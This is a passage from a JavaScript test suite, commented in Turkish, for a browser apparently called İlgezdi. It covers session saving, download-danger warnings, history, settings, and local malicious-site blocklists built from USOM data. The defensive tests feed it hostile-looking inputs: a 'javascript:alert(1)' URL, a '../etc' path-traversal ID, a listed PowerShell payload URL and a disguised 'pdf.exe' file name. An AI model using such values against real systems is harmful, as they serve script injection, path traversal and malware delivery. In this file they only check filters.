    [tampered.tabs.map((t) => t.url), tampered.tabs[1].pinned, tampered.tabs[1].entries.length, tampered.tabs[1].index, tampered.activeIndex],
    [['https://y.com/', 'https://x.com/'], false, 1, 0, 1]);
  eq('en fazla 100 sekme', bc.serializeSession(Array.from({ length: 130 }, (_, i) => ({ url: 'https://s.com/' + i })), 0).tabs.length, 100);

  const mainJs = read('main/main.js');
  const snapBody = mainJs.slice(mainJs.indexOf('function sessionSnapshot('), mainJs.indexOf('function writeProtectedJson('));
  check('oturuma yalnızca ana pencere yazılıyor (gizli pencere asla)', snapBody.includes('mainState.tabs') && !snapBody.includes('incognitoState'));
  check('oturum dosyası ziyaret günlüğü anahtarıyla şifreleniyor',
    mainJs.includes('writeProtectedJson(SESSION_ENC, SESSION_PLAIN, sessionSnapshot())') && mainJs.includes('write(encPath, secureLog._encrypt(data));'));
  check('pencere kapanırken sekmeler kapanmadan önce eşzamanlı kaydediliyor (onay istenirse onaydan sonra)',
    /mainWindow\.on\('close', \(event\) => \{[\s\S]{0,1600}\n    saveSessionNow\(\);\n  \}\);/.test(mainJs));
  check('"Kaldığım yerden" kapatılınca ve "Tüm verileri temizle"de oturum dosyası siliniyor', (mainJs.match(/deleteSessionFiles\(\);/g) || []).length >= 2);
  check('arka plan sekmeleri ilk açılışta yükleniyor', mainJs.includes('lazy: i !== saved.activeIndex') && mainJs.includes('if (tab.pendingLoad) {'));
}

suite('Tam ekran');
{
  const mainJs = read('main/main.js');
  const resizeBody = mainJs.slice(mainJs.indexOf('function resizeActiveView('), mainJs.indexOf('function setActiveTab('));
  check('video tam ekranında sekme görünümü tüm pencereye yayılıyor', /if \(state\.htmlFullscreen\)[\s\S]{0,200}setBounds\(\{ x: 0, y: 0, width: full\.width, height: full\.height \}\)/.test(resizeBody));
  check('tam ekran uyarısı betik çalıştırmayan ayrı görünümde', /new WebContentsView\(\{ webPreferences: \{ sandbox: true, contextIsolation: true, javascript: false \} \}\)/.test(mainJs));
  check('sekme değişince video tam ekranından çıkılıyor', /if \(state\.htmlFullscreen\) \{[\s\S]{0,400}exitFullscreen/.test(mainJs));
}

// ══════════════════════════════════════════════════════════════════════════════
// Geçmiş ve indirilenler — indirme güvenliği, kalıcı geçmiş (P1-C)
// ══════════════════════════════════════════════════════════════════════════════
suite('İndirme güvenliği ve indirme geçmişi');
{
  eq('uzantı: büyük harf, sondaki nokta ve boşluk, çift uzantı, gizli dosya',
    [ss.fileExtension('Kurulum.EXE'), ss.fileExtension('a.exe.'), ss.fileExtension('a.exe  '), ss.fileExtension('arsiv.tar.gz'), ss.fileExtension('.bashrc'), ss.fileExtension('uzantisiz')],
    ['exe', 'exe', 'exe', 'gz', '', '']);
  eq('tehlikeli türler', [ss.isDangerousFile('setup.msi'), ss.isDangerousFile('betik.PS1'), ss.isDangerousFile('rapor.pdf'), ss.isDangerousFile('fatura.pdf.exe'), ss.isDangerousFile('disk.iso')],
    [true, true, false, true, true]);
  eq('güvenli kaynak',
    [ss.isSecureSource('https://a.com/x.exe'), ss.isSecureSource('http://localhost:3000/x'), ss.isSecureSource('http://127.0.0.5/x'), ss.isSecureSource('http://[::1]/x'),
     ss.isSecureSource('http://a.com/x'), ss.isSecureSource('ftp://a.com/x'), ss.isSecureSource('blob:https://a.com/1')],
    [true, true, true, true, false, false, true]);
  eq('uyarı yalnızca güvensiz kaynaktan gelen tehlikeli dosyada',
    [ss.downloadNeedsWarning({ filename: 'a.exe', url: 'http://a.com/a.exe' }), ss.downloadNeedsWarning({ filename: 'a.exe', url: 'https://a.com/a.exe' }), ss.downloadNeedsWarning({ filename: 'a.zip', url: 'http://a.com/a.zip' })],
    [true, false, false]);
  eq('günlük kimliği süzgeci', ss.sanitizeLogIds(['log_1726400000000_ab12c', 'log_1726400000000_ab12c', '../etc', { id: 1 }, 'log_1_x']), ['log_1726400000000_ab12c']);
  const hist = ss.sanitizeDownloadHistory([
    { filename: 'a.pdf', state: 'completed', received: 10, total: 10, savePath: 'C:/a.pdf', sourceHost: 'a.com', startedAt: 2, item: {}, gizli: 'x' },
    { filename: 'b.bin', state: 'progressing', startedAt: 3 },
    { filename: '', state: 'completed' },
    { filename: 'c.zip', state: 'cancelled', received: 'x', startedAt: 1 },
  ]);
  eq('kalıcı geçmiş: yalnızca biten indirmeler, bilinen alanlar, sıralı',
    [hist.map((d) => d.filename), Object.keys(hist[1]).sort().join(','), hist[0].received],
    [['c.zip', 'a.pdf'], 'endedAt,filename,received,savePath,sourceHost,startedAt,state,total', 0]);
  eq('kalıcı geçmiş en fazla 200 kayıt, en yeniler kalır',
    ss.sanitizeDownloadHistory(Array.from({ length: 230 }, (_, i) => ({ filename: 'f' + i, state: 'completed', startedAt: i }))).map((d) => d.filename)[0], 'f30');

  const osMod = require('os');
  const dir = fs.mkdtempSync(path.join(osMod.tmpdir(), 'ilg-log-'));
  const { SecureLogManager: LogManager } = require('../src/main/secure-log-manager.js');
  const lm = new LogManager(dir);
  const e1 = lm.addVisit({ url: 'https://a.com/', domain: 'a.com', title: 'A' });
  const e2 = lm.addVisit({ url: 'https://b.com/', domain: 'b.com', title: 'B' });
  eq('ziyaret günlüğünden tek kayıt silinir', [lm.deleteEntries([e1.id]), lm.search({}).items.map((x) => x.id)], [1, [e2.id]]);
  check('silinen kayıt senkron kuyruğundan da çıkar', !lm.syncQueue.includes(e1.id) && lm.syncQueue.includes(e2.id));
  fs.rmSync(dir, { recursive: true, force: true });

  const mainJs = read('main/main.js');
  check('güvensiz kaynaktan tehlikeli indirme onaysız başlamıyor',
    /downloadNeedsWarning\(\{ filename, url: sourceUrl \}\)[\s\S]{0,900}event\.preventDefault\(\)/.test(mainJs));
  check('tehlikeli dosya indirilenler sayfasından onaysız açılmıyor',
    /'downloads-open'[\s\S]{0,400}isDangerousFile\(d\.filename\)[\s\S]{0,300}showMessageBox/.test(mainJs));
  check('gizli pencere indirmeleri ana pencereye gönderilmiyor ve kaydedilmiyor',
    mainJs.includes('if (!entry.incognito && mainWindow && !mainWindow.isDestroyed())') && mainJs.includes('filter((d) => !d.incognito)'));
  check('indirme geçmişi ziyaret günlüğü anahtarıyla şifreli yazılıyor', mainJs.includes('writeProtectedJson(DOWNLOADS_ENC, DOWNLOADS_PLAIN, list)'));
  const appJs = read('renderer/app.js');
  check('geçmiş ve indirilenler sayfaları artık "Yakında" değil',
    appJs.includes("showScreen('history', renderHistoryPage)") && appJs.includes("showScreen('downloads', renderDownloadsPage)") && !/history:\s*'Geçmiş'/.test(appJs));
  check('geçmişten açılan adres yalnızca http(s)', appJs.includes('if (!isWebHref(url)) return;'));
  check('boş sekme ve hata belgesi ziyaret günlüğüne yazılmıyor', read('main/main.js').includes('if (!isIncognito && isWebUrl(tab.url)) {'));
  // Ana süreç duraklatılan indirmeyi 'paused' durumuyla gönderir; sayfa bunu süren indirme saymazsa
  // Sürdür ve İptal düğmeleri kaybolur (uçtan uca sonda yakaladı).
  check('duraklatılan indirme süren indirme sayılıyor (Sürdür/İptal kaybolmaz)', (appJs.match(/d\.state === 'progressing' \|\| d\.state === 'paused'/g) || []).length >= 2);
}

// ══════════════════════════════════════════════════════════════════════════════
// Giriş ekranı — isteğe bağlı, sayfa görünümünün altında kalmamalı
// ══════════════════════════════════════════════════════════════════════════════
suite('Giriş ekranı');
{
  const authJs = read('renderer/auth-screen.js');
  const initBody = authJs.slice(authJs.indexOf('async function initAuth('), authJs.indexOf('window.ilgezdiAuth = {'));
  check('açılışta giriş ekranı kendiliğinden gösterilmiyor', initBody.length > 50 && !initBody.includes('showAuthScreen('));
  const logoutBody = authJs.slice(authJs.indexOf('logout: async'), authJs.indexOf('getSession: loadSession'));
  check('çıkışta giriş ekranı dayatılmıyor', logoutBody.length > 20 && !logoutBody.includes('showAuthScreen('));
  check('giriş Ayarlar › Hesap üzerinden açılabiliyor', read('renderer/settings-panel.js').includes('window.ilgezdiAuth?.open?.()') && authJs.includes('open: () => {'));
  const appJs = read('renderer/app.js');
  const hideBody = appJs.slice(appJs.indexOf('function hideScreen('), appJs.indexOf('// ─── VPN Göstergesi'));
  check('ekran kapanınca giriş ekranı açıksa sayfa görünümü gösterilmiyor', hideBody.includes('if (!isAuthScreenOpen()) {'));
  check('sekme adres güncellemesinde de aynı koruma', appJs.split('isAuthScreenOpen()').length - 1 >= 3);
  check('koruma animasyon sırasında da geçerli (hidden sınıfına bakıyor)', appJs.includes("return !!el && !el.classList.contains('hidden');"));
  // Kullanıcı bildirdi: Ayarlar › Hesap › "Giriş Yap" Ayarlar panelini kapatıyordu.
  const setJs = read('renderer/settings-panel.js');
  const accBody = setJs.slice(setJs.indexOf('async function bindAccountEvents('), setJs.indexOf('// ─── Özelleştirme eventleri'));
  check('Hesap sekmesindeki giriş/çıkış düğmeleri Ayarlar panelini kapatmıyor', accBody.length > 100 && !accBody.includes('ilgezdiCloseAllPanels'));
  check('giriş, kayıt, QR girişi ve çıkış sonrası Hesap sekmesi yenileniyor',
    (authJs.match(/notifyAuthChanged\(\);/g) || []).length >= 4 && setJs.includes("addEventListener('ilgezdi-auth-changed'"));
  check('Esc önce giriş penceresini kapatıyor',
    /if \(isAuthScreenOpen\(\)\) window\.ilgezdiAuth\?\.close\?\.\(\);\s*else if \(!findBar\.hidden\)/.test(appJs) && authJs.includes('close: hideAuthScreen'));
  check('giriş penceresi kapanınca odak onu açan düğmeye dönüyor', authJs.includes('back?.isConnected'));
}

// ══════════════════════════════════════════════════════════════════════════════
// Ayarlar paneli — sekme çubuğu 420 px panele sığmalı, olaylar birikmemeli
// ══════════════════════════════════════════════════════════════════════════════
suite('Ayarlar paneli');
{
  const setJs = read('renderer/settings-panel.js');
  const tabs = [...setJs.matchAll(/<button class="settings-tab[^"]*" data-tab="(\w+)" role="tab" aria-selected="(?:true|false)">/g)].map((m) => m[1]);
  eq('6 sekme, sekme rolüyle işaretli', tabs, ['customization', 'account', 'general', 'privacy', 'passwords', 'diag']);
  check('sekme çubuğu eşit sütunlu ızgara (yan yana metin 434 px tutup taşıyordu)',
    /\.settings-tabs \{[^}]*grid-template-columns:repeat\(6, minmax\(0, 1fr\)\)/.test(setJs));
  check('sekme adı sütuna sığmazsa kesilmek yerine üç nokta', /\.settings-tab-label \{[^}]*text-overflow:ellipsis/.test(setJs));
  check('panel olayları yalnızca bir kez bağlanıyor (her açılışta Kaydet dinleyicisi birikiyordu)',
    /function initSettingsPanelEvents\(\) \{\s*if \(_settingsEventsBound\) return;\s*_settingsEventsBound = true;/.test(setJs));
  check('sekme seçimi vurguyu ve aria-selected değerini birlikte güncelliyor',
    /function selectSettingsTab\([^)]*\) \{[\s\S]{0,400}aria-selected[\s\S]{0,400}renderSettingsTab\(/.test(setJs));
  check('panel her açılışta Özelleştir sekmesi vurgulu açılıyor', setJs.includes("selectSettingsTab('customization');"));
}

// ══════════════════════════════════════════════════════════════════════════════
// Zararlı site koruması — yerel tehdit listeleri (Google Safe Browsing yok)
// ══════════════════════════════════════════════════════════════════════════════
suite('Zararlı site koruması — liste ayrıştırma ve eşleşme');
{
  const tl = require('../src/main/threat-lists.js');
  eq('satır biçimleri',
    ['# yorum', '', '0.0.0.0 kotu.example', '127.0.0.1 localhost', '||oltalama.example^', 'https://www.kotu2.example/',
     'http://kotu3.example/giris.php?id=1', 'kotu4.example/panel/', '*.joker.example', '203.0.113.7', 'http://192.168.1.1/x',
     'drive.google.com', 'https://drive.google.com/file/d/abc', 'başlık,sütun iki', '0.0.0.0 kotu5.example # not']
      .map((l) => { const e = tl.parseListLine(l); return e && e.key; }),
    [null, null, 'h|kotu.example', null, 'h|oltalama.example', 'h|kotu2.example',
     'u|kotu3.example/giris.php?id=1', 'u|kotu4.example/panel', 'h|joker.example', 'h|203.0.113.7', null,
     null, 'u|drive.google.com/file/d/abc', null, 'h|kotu5.example']);

  const list = ['kotu.example', 'http://paylasim.example/zararli/dosya.exe', 'https://sorgulu.example/a?x=1',
    'raw.githubusercontent.com', 'https://raw.githubusercontent.com/kotu/repo/main/yuk.ps1', 'secure-login.com.tr', 'kotu.example'].join('\r\n');
  const c = tl.compileList(list);
  eq('derleme sayıları (tekrar tek sayılır, paylaşımlı alan adı atlanır)', [c.index.length, c.hosts, c.urls, c.skipped], [5, 3, 3, 1]);
  const inc = tl.createListCompiler();
  list.split('\n').forEach((l) => inc.add(l));
  eq('satır satır derleme tek seferlikle aynı', Array.from(inc.finish().index), Array.from(c.index));

  const m = tl.createMatcher();
  m.set('test', c.index);
  eq('alan adı girdisi alt alan adlarını da kapsar, benzer adları kapsamaz',
    ['https://kotu.example/', 'http://a.b.kotu.example/x?y', 'https://kotu.example.org/', 'https://iyikotu.example/'].map((u) => (m.match(u) || {}).kind || null),
    ['host', 'host', null, null]);
  eq('adres girdisi yalnızca o yol; sorgusuz girdi her sorgu dizesiyle',
    ['https://paylasim.example/zararli/dosya.exe', 'https://paylasim.example/zararli/dosya.exe?dl=1#x', 'https://paylasim.example/', 'https://paylasim.example/zararli/baska.exe'].map((u) => (m.match(u) || {}).kind || null),
    ['url', 'url', null, null]);
  eq('sorgulu girdi yalnızca aynı sorguyla', ['https://sorgulu.example/a?x=1', 'https://sorgulu.example/a?x=2', 'https://sorgulu.example/a'].map((u) => !!m.match(u)), [true, false, false]);
  eq('paylaşımlı barındırma: alan adının tamamı engellenmez, listelenen dosya engellenir',
    [!!m.match('https://raw.githubusercontent.com/iyi/repo/x.js'), !!m.match('https://raw.githubusercontent.com/kotu/repo/main/yuk.ps1')], [false, true]);
  eq('iki parçalı uzantının (com.tr) üstüne çıkılmaz', tl.hostCandidates('a.secure-login.com.tr'), ['a.secure-login.com.tr', 'secure-login.com.tr']);
  check('www ve büyük harf farkı eşleşmeyi bozmaz', !!m.match('HTTPS://WWW.KOTU.EXAMPLE/'));
  eq('web dışı ve yerel adresler denetlenmez', [m.match('file:///C:/kotu.example'), m.match('http://localhost/'), m.match('chrome-error://chromewebdata/'), m.match('çöp')], [null, null, null, null]);
  eq('kaynak kaldırılınca eşleşme yok', (() => { const k = tl.createMatcher(); k.set('a', c.index); k.remove('a'); return k.match('https://kotu.example/'); })(), null);

  const bytes = tl.indexToBytes(c.index);
  const shifted = Buffer.alloc(bytes.byteLength + 3);
  shifted.set(bytes, 3);
  eq('dizin diske yazılıp hizasız tampondan geri okunur', Array.from(tl.indexFromBytes(shifted.subarray(3), c.index.length) || []), Array.from(c.index));
  eq('bozuk dizin reddedilir (boyut, sayı, sıra)', [tl.indexFromBytes(new Uint8Array(12)), tl.indexFromBytes(bytes, c.index.length + 1), tl.indexFromBytes(new Uint8Array(16))], [null, null, null]);

  // Büyük liste: bellek girdi başına 8 bayt, arama hızlı
  const big = tl.createListCompiler();
  for (let i = 0; i < 200000; i++) big.add('kotu' + i + '.example');
  const bigIndex = big.finish().index;
  const bm = tl.createMatcher();
  bm.set('big', bigIndex);
  const t0 = Date.now();
  let hits = 0;
  for (let i = 0; i < 20000; i++) if (bm.match('https://cdn.site' + i + '.example/a/b.js?v=' + i)) hits++;
  const ms = Date.now() - t0;
  check('200 bin girdi 1,6 MB; 20 bin arama 1 sn altında ve yanlış eşleşme yok', bigIndex.byteLength === 1600000 && hits === 0 && ms < 1000, ms + ' ms, ' + hits + ' eşleşme');
  check('listedeki alan adı büyük dizinde bulunuyor', !!bm.match('https://www.kotu199999.example/giris'));
}

suite('Zararlı site koruması — güncelleme ve uyarı sayfası');
{
  const tl = require('../src/main/threat-lists.js');
  const H = 3600 * 1000;
  const src = { intervalHours: 12 };
  eq('hiç indirilmediyse hemen', tl.nextUpdateAt(src, undefined), 0);
  eq('başarılıysa aralık kadar sonra', tl.nextUpdateAt(src, { fetchedAt: 1000 }), 1000 + 12 * H);
  eq('hatada 15 dk, 30 dk, 1 sa… en fazla kaynak aralığı',
    [1, 2, 3, 9].map((f) => tl.nextUpdateAt(src, { fetchedAt: 1, lastAttemptAt: 5000, failures: f }) - 5000),
    [15 * 60 * 1000, 30 * 60 * 1000, 60 * 60 * 1000, 12 * H]);
  eq('7 günden eski liste güncel sayılmaz', [tl.isStale({ fetchedAt: 10 }, 10 + 6 * 24 * H), tl.isStale({ fetchedAt: 10 }, 10 + 8 * 24 * H), tl.isStale(undefined, 0)], [false, true, true]);

  const pm = tl.threatPageModel({ url: 'https://kotu.example/giris', sourceName: 'Deneme listesi', kind: 'host', token: 'abc' });
  eq('uyarı sayfası modeli', [pm.kind, pm.host, pm.canRetry, pm.proceedMessage], ['threat', 'kotu.example', false, tl.PROCEED_PREFIX + 'abc']);
  check('uyarıda adresin hiçbir sunucuya gönderilmediği yazıyor', pm.tips.some((t) => t.includes('hiçbir sunucuya gönderilmedi')));
  eq('web dışı adres modele girmez', tl.threatPageModel({ url: 'javascript:alert(1)', sourceName: 'x', kind: 'url' }).url, '');
  const script = ss.errorPageScript(pm);
  check('uyarı betiği "devam et" isteğini belirteçli konsol mesajıyla gönderiyor',
    script.includes('console.info(m.proceedMessage)') && script.includes('"proceedMessage":"ilgezdi-threat-proceed:abc"'));
  check('belirteçsiz hata sayfalarında "devam et" düğmesi yok', !JSON.stringify(ss.errorPageModel({ code: -105, url: 'https://a.com' })).includes('proceedMessage'));
}

suite('Zararlı site koruması — kaynak politikası');
{
  const tl = require('../src/main/threat-lists.js');
  check('en az bir kaynak var', tl.SOURCES.length >= 1);
  for (const s of tl.SOURCES) {
    const urls = s.urls || [s.url];
    check(s.id + ': tüm adresler https', urls.length > 0 && urls.every((u) => /^https:\/\//.test(u)));
    check(s.id + ': Google ya da koşulları uygun olmayan kaynak yok (Safe Browsing, OpenPhish, PhishTank, abuse.ch, Spamhaus)',
      urls.every((u) => !/google|safebrowsing|openphish|phishtank|abuse\.ch|spamhaus/i.test(u)));
    check(s.id + ': adreste anahtar ya da kimlik bilgisi yok', urls.every((u) => !/[?&](key|token|auth|apikey)=|auth-key/i.test(u)));
    check(s.id + ': en sık 6 saatte bir güncelleme, boyut üst sınırı ve kayıt alt sınırı tanımlı', s.intervalHours >= 6 && s.maxBytes > 0 && s.minEntries > 0);
    check(s.id + ': ad, kapsam, lisans ve kaynak sayfası ayarlarda gösterilebilir', !!(s.name && s.covers && s.license && /^https:\/\//.test(s.homepage)));
  }
  const status = tl.statusSummary(tl.SOURCES, {}, Date.now());
  check('durum özeti liste içeriği ya da adres taşımıyor', status.every((x) => Object.keys(x).sort().join() === 'covers,entries,homepage,id,lastError,license,name,stale,updatedAt'));
  const mainAll = fs.readdirSync(path.join(SRC, 'main')).filter((f) => f.endsWith('.js')).map((f) => read('main/' + f)).join('\n');
  check('ana süreçte Google Safe Browsing kullanımı yok', !/safebrowsing\.googleapis|safeBrowsing|safe-browsing/i.test(mainAll));
}

suite('Zararlı site koruması — ana süreç bağlantıları');
{
  const mainJs = read('main/main.js');
  const beforeBlocker = mainJs.slice(mainJs.indexOf('ses.webRequest.onBeforeRequest('), mainJs.indexOf('shouldBlockUrl(details.url'));
  check('istek denetimi engelleyiciden önce ve ana çerçeve dahil', beforeBlocker.includes('threats.check(details.url, ses)') && !beforeBlocker.includes("'mainFrame') return"));
  check('engellenen ana çerçevede hata sayfası yerine uyarı sayfası', /errorCode === -20 && threats \? threats\.takeBlock\(view\.webContents\)/.test(mainJs));
  check('"devam et" konsol mesajı işleniyor, sekme kapanınca kayıt siliniyor',
    mainJs.includes('threats.handleConsoleMessage(view.webContents, message)') && mainJs.includes('threats.forget(viewWcId)'));
  check('açılışta kuruluyor, varsayılan açık, ayar doğrulanıyor',
    mainJs.includes('threats.start();') && /threatProtection:\s+true,/.test(mainJs) && mainJs.includes('incoming.threatProtection = incoming.threatProtection !== false'));
  const tp = read('main/threat-protection.js');
  check('listeler bellek içi ayrı oturumla, çerezsiz ve önbelleksiz indiriliyor',
    tp.includes("FETCH_PARTITION = 'ilgezdi-threat-lists'") && tp.includes("credentials: 'omit'") && tp.includes("cache: 'no-store'"));
  check('engel günlüğüne adres yazılmıyor', tp.includes("info('Zararlı site engellendi', { source: hit.sourceId, kind: hit.kind })"));
  check('küçük ya da bozuk indirme mevcut listenin yerine geçmiyor', tp.includes('MIN_KEEP_RATIO') && tp.includes('compiled.index.length < floor'));
  check('"devam et" izni diske yazılmıyor, oturuma bağlı', tp.includes('const bypass = new WeakMap()') && !/bypass[\s\S]{0,80}writeFile/.test(tp));
  const setJs = read('renderer/settings-panel.js');
  check('ayarlarda anahtar, durum kutusu ve elle güncelleme var; ayar kaydediliyor',
    setJs.includes("row('cfg-threat'") && setJs.includes('populateThreatStatus();') && /'cfg-threat':\s*\['threatProtection', 'checked'\]/.test(setJs));
}

// ══════════════════════════════════════════════════════════════════════════════
// USOM listesi İlgezdi sunucusunda derlenir; uygulama yalnızca o dosyayı indirir
// ══════════════════════════════════════════════════════════════════════════════
suite('Zararlı site koruması — İlgezdi sunucusundaki USOM listesi');
{
  const ROOTD = path.join(__dirname, '..');
  const tl = require('../src/main/threat-lists.js');
  const usom = tl.SOURCES.find((s) => s.id === 'ilgezdi-usom');
  const mainSrcAll = fs.readdirSync(path.join(SRC, 'main')).filter((f) => f.endsWith('.js')).map((f) => read('main/' + f)).join('\n');
  check('uygulama listeyi yalnızca İlgezdi sunucusundan indiriyor, USOM API\'sine gitmiyor',
    !!usom && usom.urls.every((u) => /^https:\/\/(www\.ilgezdi\.com\.tr|ilgezdi\.vercel\.app)\/lists\/usom\.txt\.gz$/.test(u))
    && !mainSrcAll.includes('siberguvenlik.gov.tr'));

  const b = require('../scripts/build-threat-lists.js');
  eq('USOM kaydı → liste satırı',
    [
      { type: 'domain', url: 'Kotu-Banka.COM.' }, { type: 'url', url: 'kotu.example/Giris?x=1' }, { type: 'ip', url: '203.0.113.9' },
      { type: 'ip6', url: 'a83f:8110::1' }, { type: 'ip6net', url: '2001:db8::/32' }, { type: 'domain', url: 'bosluk var.com' },
      { type: 'domain', url: 'tekparca' }, { type: 'url', url: '' }, { type: 'domain', url: 'x\x00.com' }, null,
    ].map(b.toLine),
    ['kotu-banka.com', 'kotu.example/Giris?x=1', '203.0.113.9', '[a83f:8110::1]', null, null, null, null, null, null]);
  eq('sunucunun ürettiği satırları uygulama okuyabiliyor (IPv6 dahil)',
    ['kotu-banka.com', 'kotu.example/Giris?x=1', '203.0.113.9', '[a83f:8110::1]'].map((l) => { const e = tl.parseListLine(l); return e && e.key; }),
    ['h|kotu-banka.com', 'u|kotu.example/Giris?x=1', 'h|203.0.113.9', 'h|a83f:8110::1']);
  eq('köşeli parantezli bölüm başlıkları hâlâ atlanıyor', [tl.parseListLine('[Adblock Plus 2.0]'), tl.parseListLine('[genel]')], [null, null]);
  const bs = fs.readFileSync(path.join(ROOTD, 'scripts', 'build-threat-lists.js'), 'utf8');
  check('USOM başarısızsa, sayfalar eksikse ya da liste yarıdan küçükse canlı liste korunuyor; site dağıtımı durmuyor',
    (bs.match(/return keepLive\(/g) || []).length >= 3 && bs.includes('process.exitCode = 0') && b.MIN_KEEP_RATIO === 0.5 && b.MIN_COVERAGE === 0.95);
  check('liste dosyasında zaman damgası yok (içerik aynıysa ETag değişmez)', !/generatedAt[\s\S]{0,40}'#/.test(bs) && !bs.includes("'# Derlenme"));

  // Cron ucu: yalnızca Vercel Cron'un gizli anahtarıyla; kanca adresi yanıta yazılmaz.
  const cron = require('../api/cron/threat-lists.js');
  const prev = { secret: process.env.CRON_SECRET, hook: process.env.THREAT_LISTS_DEPLOY_HOOK, err: console.error };
  const call = (auth) => {
    const r = { code: 0, body: null, setHeader() {}, status(c) { this.code = c; return this; }, json(x) { this.body = x; return this; } };
    cron({ headers: auth === undefined ? {} : { authorization: auth } }, r);
    return r;
  };
  console.error = () => {};
  delete process.env.THREAT_LISTS_DEPLOY_HOOK;
  delete process.env.CRON_SECRET;
  const noSecret = call('Bearer ').code;
  process.env.CRON_SECRET = 'deneme-gizli';
  const wrong = [call().code, call('Bearer yanlis').code, call('bearer deneme-gizli').code];
  const noHook = call('Bearer deneme-gizli');
  console.error = prev.err;
  if (prev.secret === undefined) delete process.env.CRON_SECRET; else process.env.CRON_SECRET = prev.secret;
  if (prev.hook !== undefined) process.env.THREAT_LISTS_DEPLOY_HOOK = prev.hook;
  eq('cron ucu: anahtar tanımsız ya da yanlışsa 401', [noSecret, ...wrong], [401, 401, 401, 401]);
  check('cron ucu: doğru anahtarla kanca tanımsızsa 500 ve yanıtta adres yok', noHook.code === 500 && !JSON.stringify(noHook.body).includes('http'));

  const vj = JSON.parse(fs.readFileSync(path.join(ROOTD, 'vercel.json'), 'utf8'));
  check('site derlemesi listeyi üretiyor, günlük cron tanımlı (Hobby planı günde bir)',
    vj.buildCommand === 'node scripts/build-threat-lists.js' && vj.outputDirectory === 'site'
    && (vj.crons || []).some((c) => c.path === '/api/cron/threat-lists' && /^\d+ \d+ \* \* \*$/.test(c.schedule)));
  check('derleme betiği Vercel\'e yükleniyor (.vercelignore dışarıda bırakmıyor)', !/^\/?scripts\/?$/m.test(fs.readFileSync(path.join(ROOTD, '.vercelignore'), 'utf8')));
  check('üretilen liste git\'e girmiyor', fs.readFileSync(path.join(ROOTD, '.gitignore'), 'utf8').split(/\r?\n/).includes('site/lists/'));
}

suite('Site — sürüm notları');
{
  const html = fs.readFileSync(path.join(__dirname, '..', 'site', 'surumler.html'), 'utf8');
  const js = html.slice(html.indexOf('const RELEASES = ['), html.indexOf('const LABEL'));
  let releases = null;
  try { releases = new Function(js + '; return RELEASES;')(); } catch (e) { releases = e.message; }
  check('RELEASES dizisi geçerli JavaScript', Array.isArray(releases), String(releases).slice(0, 120));
  if (Array.isArray(releases)) {
    const versions = releases.map((r) => r.version);
    check('sürümler yeniden eskiye ve tekrarsız', versions.join() === [...new Set(versions)].join() && versions[0] === '0.8.0');
    check('0.8.0 yayınlandı ve "En son" etiketi onda', !releases[0].upcoming && releases.find((r) => !r.upcoming).version === '0.8.0');
    const indexHtml = fs.readFileSync(path.join(__dirname, '..', 'site', 'index.html'), 'utf8');
    const pkgVersion = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8')).version;
    check('ana sayfadaki sürüm rozeti paket sürümüyle ve sürüm notlarıyla aynı', indexHtml.includes(`const VERSION = '${pkgVersion}';`) && releases[0].version === pkgVersion);
    check('her değişikliğin türü tanımlı ve metni dolu', releases.every((r) => r.changes.every((c) => ['new', 'fix', 'sec', 'imp'].includes(c.t) && c.d.length > 20)));
    check('0.8.0 güncellemeleri tek tek listelenmiş (zararlı site koruması ve USOM dahil)', releases[0].changes.length >= 25 && releases[0].changes.some((c) => c.d.includes('USOM')));
  }
  check('işleyici "Geliştiriliyor" etiketini ve yayınlanmış ilk sürüme "En son"u veriyor', html.includes("const LATEST = RELEASES.findIndex((r) => !r.upcoming);") && html.includes('rel-upcoming-tag'));
}

// ══════════════════════════════════════════════════════════════════════════════
// Kullanıcı bildirimi (15 Eyl): sık kullanılanlar çubuğu boş, Gizlilik'teki liste
// sayıları güncellenmiyor
// ══════════════════════════════════════════════════════════════════════════════
suite('Sık kullanılanlar çubuğu');
{
  const bmJs = read('renderer/bookmarks-panel.js');
  const bar = bmJs.slice(bmJs.indexOf('function bmRenderBar('), bmJs.indexOf('// ─── Init'));
  check('çubuk dolduruluyor (eskiden HTML\'de boş yer tutucuydu)', bar.length > 300 && bmJs.includes('  bmRenderBar();'));
  // Tanıma işlevi tarayıcı bağlamı olmadan çalıştırılır (yalnızca saf ad denetimi).
  const nameFn = new Function(bmJs.slice(bmJs.indexOf('const BM_BAR_FOLDER_EN'), bmJs.indexOf('function bmBarFolderId(')) + '; return bmIsBarFolderName;')();
  eq('çubuk klasörü adları: Brave/Chrome, Edge, Firefox, İlgezdi, İngilizce; benzer adlar değil',
    ['Yer işaretleri çubuğu', 'Yer İmi Çubuğu', 'Sık kullanılanlar çubuğu', 'Yer imleri araç çubuğu', '⭐ Bookmarks Bar', 'Favorites bar', 'Çubuğu', 'Snickers bar tarifleri', 'Diğer Yer İmleri', 'Gaming'].map(nameFn),
    [true, true, true, true, true, true, true, false, false, false]);
  check('çubuk textContent ile kuruluyor, yalnızca http(s) adresler, dış favicon servisi yok',
    !bar.includes('innerHTML') && bar.includes('H.safeUrl(i.url)') && bar.includes('label.textContent') && !/google|favicons\?/i.test(bar));
  check('yer imi kaydedilince, senkronda ve başka pencerede değişince çubuk yenileniyor',
    (bmJs.match(/dispatchEvent\(new CustomEvent\('ilgezdi-bookmarks-changed'\)\)/g) || []).length >= 2
    && bmJs.includes("addEventListener('ilgezdi-bookmarks-changed', bmRenderBar)") && bmJs.includes("addEventListener('storage'"));
  check('orta tık ve Ctrl/Shift+tık yeni sekmede açıyor', bmJs.includes("addEventListener('auxclick'") && /if \(e\.ctrlKey \|\| e\.metaKey\) sb\?\.newTab\?\.\(url, \{ background: !e\.shiftKey \}\);\s*else if \(e\.shiftKey\) sb\?\.newTab\?\.\(url\);/.test(bmJs));
  check('çubuğun sonunda tüm yer imlerini açan düğme (diğer klasörler panelde)',
    bmJs.includes("'bookmark-chip bookmark-chip-all'") && bmJs.includes("closest?.('.bookmark-chip-all')"));
  check('düğme bağlantı kutusunun dışında, çubuğun sağında; bağlantılar sığmayınca görünür kalıyor',
    bar.includes("all.id = 'bookmarks-bar-all'") && bar.includes('barEl.appendChild(all)')
    && /#bookmarks-bar-items \{[^}]*flex: 1;[^}]*overflow: hidden;/.test(read('renderer/styles/main.css')));
  check('düğme bağlantılardan SONRA ekleniyor (Tab sırası görsel sırayla aynı)',
    bar.indexOf('for (const item of items)') > 0 && bar.indexOf("'bookmark-chip bookmark-chip-all'") > bar.indexOf('for (const item of items)')
    && !/\.bookmark-chip-all\s*\{[^}]*order:/.test(read('renderer/styles/main.css')));
}

suite('Zararlı site koruması — canlı liste durumu');
{
